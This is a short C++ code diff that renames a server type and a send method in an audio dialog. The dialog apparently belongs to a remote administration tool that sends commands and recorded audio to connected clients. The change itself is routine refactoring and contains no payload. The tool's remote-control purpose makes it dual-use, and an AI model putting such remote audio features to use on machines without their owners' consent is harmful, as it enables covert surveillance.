@@ -11,7 +11,7 @@
 
 IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)
 
-CAudioDlg::CAudioDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
+CAudioDlg::CAudioDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
 : DialogBase(CAudioDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_AUDIO)
 	, m_bSend(FALSE)
 {
@@ -56,7 +56,7 @@ BOOL CAudioDlg::OnInitDialog()
 	SetWindowText(strString);
 
 	BYTE bToken = COMMAND_NEXT;
-	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
+	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
 
 	//启动线程 判断CheckBox
 	m_hWorkThread = CreateThread(NULL, 0, WorkThread, (LPVOID)this, 0, NULL);
@@ -84,7 +84,7 @@ DWORD  CAudioDlg::WorkThread(LPVOID lParam)
 		LPBYTE	szBuffer = This->m_AudioObject.GetRecordBuffer(&dwBufferSize);   //播放声音
 
 		if (szBuffer != NULL && dwBufferSize > 0)
-			This->m_iocpServer->OnClientPreSending(This->m_ContextObject, szBuffer, dwBufferSize); //没有消息头
+			This->m_iocpServer->Send2Client(This->m_ContextObject, szBuffer, dwBufferSize); //没有消息头
 	}
 	This->m_bThreadRun = FALSE;
 
